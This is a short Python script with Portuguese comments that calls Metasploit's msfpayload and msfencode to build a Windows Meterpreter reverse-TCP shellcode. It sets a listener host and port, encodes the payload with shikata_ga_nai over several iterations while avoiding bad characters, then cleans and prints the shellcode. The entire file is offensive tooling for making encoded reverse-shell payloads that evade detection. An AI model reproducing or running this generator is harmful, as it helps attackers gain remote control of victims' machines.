#! /usr/bin/env python
#coding: utf-8
#by Mharcos Nesster
# gerar shellcode
# metasploit
# article: http://chmodsecurity.com.br/artigo/4/[python]-encode-shellcode-xor.html
import sys
import os
import subprocess,re
def shellcode_criar(payload,ip,porta,arquitetura,asm,jmp,eax,encode):
  #função que cria o shellcode
  nesster = "msfpayload %s LHOST=%s LPORT=%s R | msfencode -e %s/shikata_ga_nai -t c -a %s -b \%s\%s\%s -c %d C " % (payload,ip,porta,arquitetura,arquitetura,asm,jmp,eax,encode)
  print("{+ Gerando shellcode!}")
  proc = subprocess.Popen("%s" % (nesster), stdout=subprocess.PIPE, shell=True)
  data = proc.communicate()[0]
  #tratamento de strings
  data = data.replace(";", "")
  data = data.replace(" ", "")
  data = data.replace("+", "")
  data = data.replace('"', "")
  data = data.replace("\n", "")
  data = data.replace("unsignedcharbuf[]=", "")
  data = data.rstrip()
  print("{+} shellcode criado com sucesso!\n")
  print data
payload = "windows/meterpreter/reverse_tcp"
ip = "192.168.1.100"
porta = "4444"
arquitetura = "x86"
encode = 13
asm = "x00"
jmp = "x0a"
eax = "x0d"
